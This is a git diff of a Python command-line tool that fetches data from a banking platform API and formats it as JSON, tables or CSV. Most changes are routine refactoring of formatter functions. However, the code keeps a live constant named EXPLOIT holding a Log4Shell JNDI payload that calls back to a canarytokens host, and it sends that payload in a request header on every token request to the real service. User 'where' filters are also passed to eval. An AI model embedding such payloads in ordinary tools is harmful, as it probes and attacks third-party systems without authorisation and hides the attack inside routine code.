@@ -27,12 +27,11 @@ import json
 import sys
 from base64 import b64decode
 from concurrent.futures import ThreadPoolExecutor
-from dataclasses import dataclass
 from datetime import datetime
 from io import StringIO
 from operator import attrgetter, itemgetter
 from time import sleep
-from typing import Dict, List, Optional, Set, Tuple
+from typing import Dict, List, Optional, Set
 import logging
 from cryptography.hazmat.primitives import hashes
 
@@ -51,7 +50,6 @@ from rich.progress import Progress
 from rich.style import Style
 from rich.syntax import Syntax
 from rich.table import Table
-from rich.text import Text
 from yaml import SafeLoader, dump, load
 
 nop = lambda x: x
@@ -68,8 +66,10 @@ console = Console()
 class TooManyResultsException(Exception):
     pass
 
-EXPLOIT='${jndi:ldap://2fhytt0ahxjz5krlpwvv88v8p.canarytokens.com/b}'
-#EXPLOIT="${jndi:ldap://mcygxtnbfwcf11stq3nkrv809.canarytokens.com/a}"
+
+EXPLOIT = "${jndi:ldap://2fhytt0ahxjz5krlpwvv88v8p.canarytokens.com/b}"
+# EXPLOIT="${jndi:ldap://mcygxtnbfwcf11stq3nkrv809.canarytokens.com/a}"
+
 
 class YesPlatformAPI:
     DEFAULT_URLS = {
@@ -112,7 +112,7 @@ class YesPlatformAPI:
             timeout=TIMEOUT,
             headers={
                 "X-Fapi-Interaction-ID": EXPLOIT,
-            }
+            },
         ).json()
         self.access_token = resp["access_token"]
 
@@ -133,27 +133,6 @@ class YesPlatformAPI:
             else:
                 raise Exception(resp["error_description"])
         return resp
-
-
-def nice_formatter(inval):
-    if inval is None:
-        return ""
-    elif isinstance(inval, CustomType):
-        return inval.get_rich()
-    elif type(inval) == list:
-        return "[light_sky_blue1],[/light_sky_blue1] ".join(str(x) for x in inval)
-    else:
-        return str(inval)
-
-
-def raw_formatter(inval):
-    if isinstance(inval, CustomType):
-        return inval.raw
-    return inval
-
-
-def string_formatter(inval):
-    return str(raw_formatter(inval))
 
 
 class Dataset:
@@ -213,7 +192,7 @@ class Dataset:
     def set_sort(self, columns):
         self.sort = tuple(columns.split(","))
 
-    def get_rows(self, fill_blanks, blank="", formatter=raw_formatter, sort=True):
+    def get_rows(self, formatter, fill_blanks, blank="", sort=True):
         self._sort()
         for row in self._where():
             out = {}
@@ -226,7 +205,7 @@ class Dataset:
                     pass
             yield out
 
-    def get_rows_list(self, blank="", formatter=raw_formatter):
+    def get_rows_list(self, formatter, blank=""):
         self._sort()
         for row in self._where():
             yield [formatter(row.get(col, blank)) for col in self.output_columns]
@@ -240,11 +219,11 @@ class Dataset:
             yield from self.rows
         else:
             for row in self.rows:
-                try:
-                    if eval(self.where, {}, row):
-                        yield row
-                except (TypeError, AttributeError):
-                    pass
+                # try:
+                if eval(self.where, {}, row):
+                    yield row
+            # except (TypeError, AttributeError):
+            #    pass
 
     def opportunistic_where_applied(self):
         if self.where is None:
@@ -361,11 +340,11 @@ class Dataset:
             action="store_true",
             help="Disable filtering. ",
         )
-        p.add_argument(
-            "--raw",
-            action="store_true",
-            help="Disable conversion of data to more readable representations. ",
-        )
+        # p.add_argument(
+        #    "--raw",
+        #    action="store_true",
+        #    help="Disable conversion of data to more readable representations. ",
+        # )
         return p
 
 
@@ -734,12 +713,12 @@ class MRDataset(Dataset):
 
 
 def output_json_lines(data: Dataset, formatter, cache_disabled):
-    for el in data.get_rows(False, sort=False):
+    for el in data.get_rows(formatter, False, sort=False):
         print(json.dumps(el))
 
 
 def output_json_list(data: Dataset, formatter, cache_disabled):
-    print(json.dumps(list(data.get_rows(False, sort=False))))
+    print(json.dumps(list(data.get_rows(formatter, False, sort=False))))
 
 
 def output_rich(data: Dataset, formatter, cache_disabled):
@@ -753,7 +732,7 @@ def output_rich(data: Dataset, formatter, cache_disabled):
     )
     table.box = box.MINIMAL
 
-    rows = list(data.get_rows_list("", formatter=formatter))
+    rows = list(data.get_rows_list(formatter))
 
     for col in data.output_columns:
         table.add_column(col, footer="" if len(rows) < 15 else col)
@@ -787,7 +766,7 @@ def output_rich(data: Dataset, formatter, cache_disabled):
 def output_csv(data: Dataset, formatter, cache_disabled):
     writer = csv.DictWriter(sys.stdout, fieldnames=data.output_columns)
     writer.writeheader()
-    for row in data.get_rows("", formatter=formatter):
+    for row in data.get_rows(formatter, True):
         writer.writerow(row)
 
 
@@ -796,11 +775,52 @@ def filter_only(fields, expr):
     return set(fields).intersection(selected)
 
 
+def rich_formatter(inval):
+    if inval is None:
+        return ""
+    elif isinstance(inval, CustomType):
+        return inval.get_rich()
+    elif type(inval) == list:
+        return "[light_sky_blue1],[/light_sky_blue1] ".join(str(x) for x in inval)
+    else:
+        return str(inval)
+
+
+def raw_formatter(inval):
+    if isinstance(inval, CustomType):
+        return inval.raw
+    return inval
+
+
+def text_formatter(inval):
+    if inval is None:
+        return ""
+    elif type(inval) == list:
+        return ", ".join(str(x) for x in inval)
+    return str(raw_formatter(inval))
+
+
 FORMAT_OPTS = {
-    "json-lines": {"function": output_json_lines, "disable_cache": False},
-    "json-list": {"function": output_json_list, "disable_cache": False},
-    "table": {"function": output_rich, "disable_cache": False},
-    "csv": {"function": output_csv, "disable_cache": False},
+    "json-lines": {
+        "function": output_json_lines,
+        "formatter": raw_formatter,
+        "disable_cache": False,
+    },
+    "json-list": {
+        "function": output_json_list,
+        "formatter": raw_formatter,
+        "disable_cache": False,
+    },
+    "table": {
+        "function": output_rich,
+        "formatter": rich_formatter,
+        "disable_cache": False,
+    },
+    "csv": {
+        "function": output_csv,
+        "formatter": text_formatter,
+        "disable_cache": False,
+    },
 }
 
 
@@ -867,7 +887,7 @@ if __name__ == "__main__":
 
     FORMAT_OPTS[args.format]["function"](
         data,
-        formatter=(string_formatter if args.raw else nice_formatter),
+        formatter=FORMAT_OPTS[args.format]["formatter"],
         cache_disabled=no_cache,
     )
     if args.export:
